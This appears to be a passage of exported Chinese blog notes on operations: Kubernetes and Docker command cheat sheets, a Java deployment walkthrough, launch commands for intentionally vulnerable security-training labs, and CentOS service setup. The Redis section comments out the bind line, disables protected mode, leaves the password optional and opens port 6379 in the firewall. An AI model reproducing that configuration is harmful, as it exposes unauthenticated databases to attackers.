<h4 id="Pod相关"><a href="#Pod相关" class="headerlink" title="Pod相关"></a>Pod相关</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods                                        # 查看所有pod</span><br><span class="line">kubectl get pods -o wide                                # 查看pod及所在节点</span><br><span class="line">kubectl describe pod &lt;pod-name&gt;                         # 查看pod详细信息</span><br><span class="line">kubectl logs &lt;pod-name&gt;                                 # 查看pod日志</span><br><span class="line">kubectl logs -f &lt;pod-name&gt;                              # 实时查看pod日志</span><br><span class="line">kubectl exec -it &lt;pod-name&gt; -- /bin/bash                # 进入pod的shell</span><br><span class="line">kubectl port-forward &lt;pod-name&gt; &lt;local-port&gt;:&lt;pod-port&gt;  # 端口转发</span><br></pre></td></tr></table></figure>
<h4 id="Deployment相关"><a href="#Deployment相关" class="headerlink" title="Deployment相关"></a>Deployment相关</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get deployments                                     # 查看所有deployment</span><br><span class="line">kubectl describe deployment &lt;deploy-name&gt;                   # 查看deployment详情</span><br><span class="line">kubectl scale deployment &lt;deploy-name&gt; --replicas=&lt;number&gt;  # 扩缩容</span><br><span class="line">kubectl rollout status deployment &lt;deploy-name&gt;             # 查看滚动更新状态</span><br><span class="line">kubectl rollout history deployment &lt;deploy-name&gt;            # 查看部署历史</span><br><span class="line">kubectl rollout undo deployment &lt;deploy-name&gt;               # 回滚到上一版本</span><br></pre></td></tr></table></figure>
<h4 id="Service相关"><a href="#Service相关" class="headerlink" title="Service相关"></a>Service相关</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get services                                                                # 查看所有service</span><br><span class="line">kubectl describe service &lt;svc-name&gt;                                                 # 查看service详情</span><br><span class="line">kubectl expose deployment &lt;deploy-name&gt; --port=&lt;port&gt; --target-port=&lt;target-port&gt;   # 创建service</span><br></pre></td></tr></table></figure>
<h4 id="命名空间操作"><a href="#命名空间操作" class="headerlink" title="命名空间操作"></a>命名空间操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get namespaces                                      # 查看所有命名空间</span><br><span class="line">kubectl create namespace &lt;ns-name&gt;                          # 创建命名空间</span><br><span class="line">kubectl config set-context --current --namespace=&lt;ns-name&gt;  # 设置默认命名空间</span><br></pre></td></tr></table></figure>
<h4 id="调试命令"><a href="#调试命令" class="headerlink" title="调试命令"></a>调试命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl top nodes                                           # 查看节点资源使用情况</span><br><span class="line">kubectl top pods                                            # 查看pod资源使用情况</span><br><span class="line">kubectl get events                                          # 查看集群事件</span><br><span class="line">kubectl get events --sort-by=&#x27;.metadata.creationTimestamp&#x27;  # 按时间排序查看事件</span><br></pre></td></tr></table></figure>
<h4 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get configmaps                # 查看configmap</span><br><span class="line">kubectl get secrets                   # 查看secret</span><br><span class="line">kubectl edit &lt;resource&gt; &lt;name&gt;        # 编辑资源</span><br></pre></td></tr></table></figure>
<h4 id="其他实用命令"><a href="#其他实用命令" class="headerlink" title="其他实用命令"></a>其他实用命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl api-resources                       # 查看所有API资源类型</span><br><span class="line">kubectl explain &lt;resource&gt;                  # 查看资源定义说明</span><br><span class="line">kubectl cp &lt;pod-name&gt;:&lt;path&gt; &lt;local-path&gt;   # 从pod复制文件到本地</span><br><span class="line">kubectl auth can-i &lt;verb&gt; &lt;resource&gt;        # 检查权限</span><br></pre></td></tr></table></figure>


<h3 id="Kubernetes部署JAVA"><a href="#Kubernetes部署JAVA" class="headerlink" title="Kubernetes部署JAVA"></a>Kubernetes部署JAVA</h3><h4 id="第一步：准备阶段"><a href="#第一步：准备阶段" class="headerlink" title="第一步：准备阶段"></a>第一步：准备阶段</h4><p>在开始之前，你需要确保自己的工作环境已经配置好了必要的工具。包括但不限于 Docker（用来打包 Java 应用）、kubectl（Kubernetes 的命令行工具）以及 Helm（一种方便快捷的 K8s 包管理工具）。如果你还不熟悉这些工具的话，别担心，我会尽量用最简单的语言给你解释清楚。假设你已经有了一个简单的 Spring Boot 应用程序。首先要做的是将其容器化。也就是说，我们需要创建一个 Dockerfile 文件来定义这个应用是如何被封装成镜像的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用官方 OpenJDK 镜像作为基础</span><br><span class="line">FROM openjdk:17-jdk-slim</span><br><span class="line"></span><br><span class="line"># 设置工作目录</span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># 复制构建好的 JAR 包到镜像内</span><br><span class="line">COPY target/my-awesome-java-app.jar app.jar</span><br><span class="line"></span><br><span class="line"># 暴露端口</span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line"># 定义启动命令</span><br><span class="line">CMD [&quot;java&quot;, &quot;-jar&quot;, &quot;app.jar&quot;]</span><br></pre></td></tr></table></figure>
<p>在这个 Dockerfile 中，我们指定了基础镜像、工作目录、复制文件、暴露端口，并设置了容器启动时执行的命令。完成之后，你可以通过执行 docker build -t my-java-app . 来构建镜像。然后使用 docker run 命令验证一下是否能正常运行。</p>
<h4 id="第二步：编写-Deployment-配置文件"><a href="#第二步：编写-Deployment-配置文件" class="headerlink" title="第二步：编写 Deployment 配置文件"></a>第二步：编写 Deployment 配置文件</h4><p>当我们的应用成功被打包成 Docker 镜像后，下一步就是告诉 K8s 如何运行这个应用。这里需要用到 YAML 或 JSON 格式的配置文件。我们先来看一个典型的 Deployment 配置示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: my-java-deployment</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: my-java-app</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: my-java-app</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: my-java-container</span><br><span class="line">        image: my-java-app:latest</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure>
<p>这段配置文件告诉 K8s 我们希望运行三个副本（replicas）的 Java 应用实例，并且这些实例会监听 8080 端口。selector 字段用于匹配 Pod 的标签，而 template 部分则描述了每个 Pod 的具体设置。</p>
<h4 id="第三步：应用配置并检查状态"><a href="#第三步：应用配置并检查状态" class="headerlink" title="第三步：应用配置并检查状态"></a>第三步：应用配置并检查状态</h4><p>现在，有了完整的配置文件后，就可以通过 kubectl apply 命令将其应用到集群中了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f deployment.yaml</span><br></pre></td></tr></table></figure>
<p>接着，我们可以用以下命令来查看 Deployment 和相关的 Pods 是否正确创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get deployments</span><br><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>
<p>如果你看到类似 my-java-deployment-xxx 的 Pods 名称出现，并且它们的状态都是 Running，那么恭喜你，你的 Java 应用已经在 K8s 上顺利部署啦！</p>
<h4 id="第四步：服务暴露与外部访问"><a href="#第四步：服务暴露与外部访问" class="headerlink" title="第四步：服务暴露与外部访问"></a>第四步：服务暴露与外部访问</h4><p>为了让外界能够访问我们的 Java 应用，还需要创建一个 Service 来暴露应用的服务。这里以 LoadBalancer 类型为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: my-java-service</span><br><span class="line">spec:</span><br><span class="line">  type: LoadBalancer</span><br><span class="line">  selector:</span><br><span class="line">    app: my-java-app</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 8080</span><br></pre></td></tr></table></figure>
<p>上述配置会创建一个外部可访问的服务，将请求转发给后端的 Java 应用实例。完成后再次应用配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f service.yaml</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker笔记</title>
    <url>/cnblogs.github.io/2025/01/10/operations/docker/docker%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="Dokcer基本命令"><a href="#Dokcer基本命令" class="headerlink" title="Dokcer基本命令"></a>Dokcer基本命令</h3><h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><h5 id="镜像（Image）相关命令"><a href="#镜像（Image）相关命令" class="headerlink" title="镜像（Image）相关命令"></a>镜像（Image）相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images                                                    # 查看本地所有镜像</span><br><span class="line">docker search &lt;镜像名&gt;                                            # 从 Docker Hub 搜索镜像（如 docker search nginx）</span><br><span class="line">docker pull &lt;镜像名:标签&gt;                                         #  拉取镜像（如 docker pull nginx:latest）</span><br><span class="line">docker rmi &lt;镜像ID或名称&gt;                                         # 删除本地镜像（-f 强制删除）</span><br><span class="line">docker build -t &lt;镜像名&gt; .                                        # 根据当前目录的 Dockerfile 构建镜像</span><br><span class="line">docker save -o &lt;文件名&gt;.tar &lt;镜像名&gt;                               # 将镜像保存为 .tar 文件（备份）</span><br><span class="line">docker load -i &lt;文件名&gt;.tar                                       # 从 .tar 文件加载镜像</span><br></pre></td></tr></table></figure>
<h5 id="容器（Container）相关命令"><a href="#容器（Container）相关命令" class="headerlink" title="容器（Container）相关命令"></a>容器（Container）相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps                                                       # 查看运行中的容器</span><br><span class="line">docker ps -a                                                    # 查看所有容器（包括已停止的）</span><br><span class="line">docker run -d -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名&gt; &lt;镜像名&gt;    # 启动容器（-d 后台运行，-p 端口映射）</span><br><span class="line">docker start/stop/restart &lt;容器名或ID&gt;                          # 启动/停止/重启容器</span><br><span class="line">docker rm &lt;容器名或ID&gt;                                          # 删除已停止的容器（-f 强制删除运行中的容器）</span><br><span class="line">docker exec -it &lt;容器名或ID&gt; /bin/bash                          # 进入运行中的容器（交互式终端）</span><br><span class="line">docker logs &lt;容器名或ID&gt;                                        # 查看容器日志（-f 实时跟踪）</span><br></pre></td></tr></table></figure>
<h5 id="网络（Network）相关命令"><a href="#网络（Network）相关命令" class="headerlink" title="网络（Network）相关命令"></a>网络（Network）相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network ls                                               # 查看所有网络</span><br><span class="line">docker network create &lt;网络名&gt;                                  # 创建自定义网络</span><br><span class="line">docker network inspect &lt;网络名&gt;                                 # 查看网络详情</span><br><span class="line">docker network connect &lt;网络名&gt; &lt;容器名&gt;                         # 将容器连接到指定网络</span><br></pre></td></tr></table></figure>
<h5 id="数据卷（Volume）相关命令"><a href="#数据卷（Volume）相关命令" class="headerlink" title="数据卷（Volume）相关命令"></a>数据卷（Volume）相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume ls                                                # 查看所有数据卷</span><br><span class="line">docker volume create &lt;卷名&gt;                                      # 创建数据卷</span><br><span class="line">docker volume inspect &lt;卷名&gt;                                     # 查看数据卷详情</span><br><span class="line">docker run -v &lt;主机路径&gt;:&lt;容器路径&gt; &lt;镜像名&gt;                       # 挂载主机目录到容器</span><br><span class="line">docker run -v &lt;卷名&gt;:&lt;容器路径&gt; &lt;镜像名&gt;                           # 使用数据卷挂载</span><br></pre></td></tr></table></figure>
<h5 id="清理与维护"><a href="#清理与维护" class="headerlink" title="清理与维护"></a>清理与维护</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker system df                                                # 查看 Docker 磁盘使用情况</span><br><span class="line">docker system prune                                             # 清理无用镜像、容器、网络（-a 包含未使用的镜像）</span><br><span class="line">docker container prune                                          # 删除所有已停止的容器</span><br><span class="line">docker image prune                                              # 删除未被使用的镜像</span><br></pre></td></tr></table></figure>

<h3 id="Dockerfile指令详解案例"><a href="#Dockerfile指令详解案例" class="headerlink" title="Dockerfile指令详解案例"></a>Dockerfile指令详解案例</h3><h4 id="类似if-else-条件表达式"><a href="#类似if-else-条件表达式" class="headerlink" title="类似if-else 条件表达式"></a>类似if-else 条件表达式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Use an Ubuntu base image</span><br><span class="line">FROM ubuntu:20.04</span><br><span class="line"></span><br><span class="line"># Avoid prompts with apt</span><br><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"># Declare an argument for the web server</span><br><span class="line">ARG WEBSERVER</span><br><span class="line"></span><br><span class="line"># Use shell logic to determine which server to install</span><br><span class="line">RUN if [ &quot;$WEBSERVER&quot; = &quot;nginx&quot; ]; then \</span><br><span class="line">        apt-get update &amp;&amp; apt-get install -y nginx; \</span><br><span class="line">    elif [ &quot;$WEBSERVER&quot; = &quot;apache&quot; ]; then \</span><br><span class="line">        apt-get update &amp;&amp; apt-get install -y apache2; \</span><br><span class="line">    else \</span><br><span class="line">        echo &quot;No valid webserver specified&quot;; \</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line"># Rest of the Dockerfile... </span><br></pre></td></tr></table></figure>
<p>构建镜像并指定 web 服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build --build-arg WEBSERVER=nginx -t myimage:latest .</span><br></pre></td></tr></table></figure>

<h3 id="Dokcer配置相关"><a href="#Dokcer配置相关" class="headerlink" title="Dokcer配置相关"></a>Dokcer配置相关</h3><h4 id="修改镜像源"><a href="#修改镜像源" class="headerlink" title="修改镜像源"></a>修改镜像源</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;: [</span><br><span class="line">		&quot;https://docker.13140521.xyz&quot;,</span><br><span class="line">		&quot;https://docker.1panel.live&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 重启docker 服务</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>

<h3 id="Dokcer相关工具"><a href="#Dokcer相关工具" class="headerlink" title="Dokcer相关工具"></a>Dokcer相关工具</h3><h4 id="单机版安装"><a href="#单机版安装" class="headerlink" title="单机版安装"></a>单机版安装</h4><h5 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## sqlserver镜像拉取</span><br><span class="line">sudo docker pull mcr.microsoft.com/mssql/server:2022-latest</span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;MSSQL_SA_PASSWORD=&lt;Q1w2e3r4&gt;&quot; -p 1433:1433 --name sql_server -d mcr.microsoft.com/mssql/server:2022-latest</span><br></pre></td></tr></table></figure>
<h5 id="webgoat"><a href="#webgoat" class="headerlink" title="webgoat"></a>webgoat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## webgoat镜像拉取</span><br><span class="line">sudo docker pull webgoat/webgoat-8.0</span><br><span class="line">sudo docker pull webgoat/webwolf</span><br><span class="line">sudo docker pull webgoat/goatandwolf</span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -dt --name webgoat -p 30007:8888 -p 30001:8080 -p 30008:9090 webgoat/goatandwolf</span><br></pre></td></tr></table></figure>
<h5 id="upload-lab"><a href="#upload-lab" class="headerlink" title="upload-lab"></a>upload-lab</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## upload-labs镜像拉取</span><br><span class="line">docker pull cuer/upload-labs</span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -dt --name upload-labs -p 30002:80 cuer/upload-labs</span><br></pre></td></tr></table></figure>
<h5 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## sqli-labs镜像拉取</span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -dt --name sqli-labs -p 30003:80 -p 13306:3306 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
<h5 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## pikachu镜像拉取</span><br><span class="line">docker pull area39/pikachu</span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -dt --name pikachu -p 30004:80 area39/pikachu</span><br></pre></td></tr></table></figure>
<h5 id="dwa"><a href="#dwa" class="headerlink" title="dwa"></a>dwa</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## dvwa镜像拉取</span><br><span class="line">docker pull sagikazarmark/dvwa</span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -dt --name dvwa -p 30005:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
<h5 id="xss-challenge-tour"><a href="#xss-challenge-tour" class="headerlink" title="xss-challenge-tour"></a>xss-challenge-tour</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## xss-challenge-tour镜像拉取</span><br><span class="line">docker pull c0ny1/xss-challenge-tour </span><br><span class="line">## 启动</span><br><span class="line">sudo docker run -dt --name xss -p 30006:80 c0ny1/xss-challenge-tour</span><br></pre></td></tr></table></figure>
<h5 id="Leanote"><a href="#Leanote" class="headerlink" title="Leanote"></a>Leanote</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker pull axboy/leanote</span><br><span class="line"></span><br><span class="line">sudo docker run -d -p 9800:9000 \</span><br><span class="line">    -e &quot;TZ=Asia/Shanghai&quot;\</span><br><span class="line">    -v /data/leanote/db:/data/db \</span><br><span class="line">    -v /data/leanote/conf/:/data/leanote/conf \</span><br><span class="line">    -v /data/leanote/files:/data/leanote/files \</span><br><span class="line">    -v /data/leanote/upload:/data/leanote/public/upload \</span><br><span class="line">    --name leanote \</span><br><span class="line">    axboy/leanote</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS笔记</title>
    <url>/cnblogs.github.io/2025/01/10/operations/linux/CentOS%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="常规配置"><a href="#常规配置" class="headerlink" title="常规配置"></a>常规配置</h2><h3 id="更新YUM源"><a href="#更新YUM源" class="headerlink" title="更新YUM源"></a>更新YUM源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /etc/yum.repos.d</span><br><span class="line">cp CentOS-Base.repo CentOS-Base.repo.backup</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<h3 id="设置Java开机自动运行"><a href="#设置Java开机自动运行" class="headerlink" title="设置Java开机自动运行"></a>设置Java开机自动运行</h3><h4 id="方法一：使用systemd服务"><a href="#方法一：使用systemd服务" class="headerlink" title="方法一：使用systemd服务"></a>方法一：使用systemd服务</h4><p>systemd是Linux系统中广泛使用的初始化系统和系统管理守护进程，可以用来管理开机启动项</p>
<h5 id="创建一个服务文件"><a href="#创建一个服务文件" class="headerlink" title="创建一个服务文件"></a>创建一个服务文件</h5><p>创建一个新的service文件，例如ruoyi-admin.service，路径为&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/ruoyi-admin.service</span><br></pre></td></tr></table></figure>
<h5 id="编辑服务文件"><a href="#编辑服务文件" class="headerlink" title="编辑服务文件"></a>编辑服务文件</h5><p>在文件中添加以下内容，根据实际情况修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=ruoyi-admin</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line">WorkingDirectory=/home/zhao/programs/ruoyi</span><br><span class="line">ExecStart=/usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br><span class="line">SuccessExitStatus=143</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=10</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<ul>
<li>Description：服务的描述。</li>
<li>After：指定该服务在</li>
<li>network.target之后启动。</li>
<li>User和Group：运行该服务的用户和组。</li>
<li>WorkingDirectory：工作目录。</li>
<li>ExecStart：启动Java程序的命令。</li>
<li>SuccessExitStatus：程序正常退出的状态码。</li>
<li>Restart：设置服务在失败后自动重启。</li>
<li>RestartSec：重启前的等待时间。</li>
</ul>
<h5 id="重新加载systemd配置并启动服务"><a href="#重新加载systemd配置并启动服务" class="headerlink" title="重新加载systemd配置并启动服务"></a>重新加载systemd配置并启动服务</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl start ruoyi-admin</span><br></pre></td></tr></table></figure>
<h5 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable ruoyi-admin</span><br></pre></td></tr></table></figure>
<h5 id="检查服务状态"><a href="#检查服务状态" class="headerlink" title="检查服务状态"></a>检查服务状态</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl status ruoyi-admin</span><br></pre></td></tr></table></figure>

<h4 id="方法二：使用crontab"><a href="#方法二：使用crontab" class="headerlink" title="方法二：使用crontab"></a>方法二：使用crontab</h4><h5 id="编辑crontab文件"><a href="#编辑crontab文件" class="headerlink" title="编辑crontab文件"></a>编辑crontab文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
<h5 id="添加开机启动项"><a href="#添加开机启动项" class="headerlink" title="添加开机启动项"></a>添加开机启动项</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@reboot /usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的@reboot表示在系统启动时执行该命令。</li>
<li>保存文件并退出编辑器，crontab会自动重新加载配置</li>
</ul>
<h4 id="方法三：使用rc-local"><a href="#方法三：使用rc-local" class="headerlink" title="方法三：使用rc.local"></a>方法三：使用rc.local</h4><h5 id="编辑rc-local文件"><a href="#编辑rc-local文件" class="headerlink" title="编辑rc.local文件"></a>编辑rc.local文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<h5 id="添加启动命令"><a href="#添加启动命令" class="headerlink" title="添加启动命令"></a>添加启动命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br></pre></td></tr></table></figure>
<h5 id="赋予rc-local执行权限"><a href="#赋予rc-local执行权限" class="headerlink" title="赋予rc.local执行权限"></a>赋予rc.local执行权限</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<h5 id="启动rc-local服务"><a href="#启动rc-local服务" class="headerlink" title="启动rc.local服务"></a>启动rc.local服务</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start rc.local</span><br></pre></td></tr></table></figure>
<h5 id="设置开机自启-1"><a href="#设置开机自启-1" class="headerlink" title="设置开机自启"></a>设置开机自启</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable rc.local</span><br></pre></td></tr></table></figure>


<h2 id="YUM命令【安装软件】"><a href="#YUM命令【安装软件】" class="headerlink" title="YUM命令【安装软件】"></a>YUM命令【安装软件】</h2><h3 id="Nginx1-22-1安装"><a href="#Nginx1-22-1安装" class="headerlink" title="Nginx1.22.1安装"></a>Nginx1.22.1安装</h3><h4 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/packages/centos/7/x86_64/RPMS/nginx-1.22.1-1.el7.ngx.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum localinstall nginx-1.22.1-1.el7.ngx.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line">/etc/nginx        #主目录</span><br><span class="line">/etc/nginx/nginx.conf   #配置文件</span><br><span class="line">/var/log/nginx    #日志</span><br><span class="line">/var/cache/nginx  #缓存</span><br><span class="line">/usr/sbin/nginx   #主程序</span><br><span class="line">/usr/lib64/nginx/modules  #组件模块</span><br></pre></td></tr></table></figure>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start nginx          # 启动服务</span><br><span class="line">sudo systemctl enable nginx         # 设置为开机自启</span><br><span class="line">sudo systemctl status nginx         # 检查 服务状态</span><br></pre></td></tr></table></figure>

<h3 id="Redis5-0安装"><a href="#Redis5-0安装" class="headerlink" title="Redis5.0安装"></a>Redis5.0安装</h3><h4 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://rpmfind.net/linux/remi/enterprise/9/modular/x86_64/redis-5.0.14-1.el9.remi.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum localinstall redis-5.0.14-1.el7.remi.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo  nano /etc/redis.conf</span><br><span class="line"></span><br><span class="line"># daemonized no 改为 daemonized yes 以后台静默进程启动</span><br><span class="line"># 把 bind 127.0.0.1 注释掉</span><br><span class="line"># protected-mode yes 把yes改为no</span><br><span class="line"># 如果想要设置密码: requirepass 密码（可选）</span><br></pre></td></tr></table></figure>
<h4 id="启动-1"><a href="#启动-1" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 重启redis服务</span><br><span class="line">sudo systemctl restart redis.service</span><br><span class="line"></span><br><span class="line"># 设置redis服务为开机自启</span><br><span class="line">sudo systemctl enable redis.service</span><br><span class="line"></span><br><span class="line">#  查看redis是否启动成功</span><br><span class="line">ps aux | grep redis</span><br><span class="line"></span><br><span class="line"># 检查 Redis 服务状态</span><br><span class="line">sudo systemctl status redis</span><br></pre></td></tr></table></figure>
<h4 id="防护墙打开端口6379"><a href="#防护墙打开端口6379" class="headerlink" title="防护墙打开端口6379"></a>防护墙打开端口6379</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加端口到 firewalld</span><br><span class="line">sudo firewall-cmd --zone=public --add-port=6379/tcp --permanent</span><br><span class="line"></span><br><span class="line"># 重新加载防火墙配置</span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Server安装"><a href="#SQL-Server安装" class="headerlink" title="SQL Server安装"></a>SQL Server安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 添加 Microsoft 的官方存储库：</span><br><span class="line">sudo curl -o /etc/yum.repos.d/mssql-server. repo https://packages.microsoft.com/config/rhel/7/mssql-server-2019.repo</span><br><span class="line">## 安装 SQL Server：</span><br><span class="line">sudo yum install -y mssql-server</span><br><span class="line">## 配置 SQL Server：</span><br><span class="line">sudo /opt/mssql/bin/mssql-conf setup</span><br><span class="line">## 在配置过程中，你需要接受许可协议并设置 SA 用户的密码。</span><br><span class="line">## 启动 SQL Server 服务：</span><br><span class="line">sudo systemctl start mssql-server</span><br><span class="line">## 验证 SQL Server 服务是否正在运行：</span><br><span class="line">systemctl status mssql-server</span><br></pre></td></tr></table></figure>


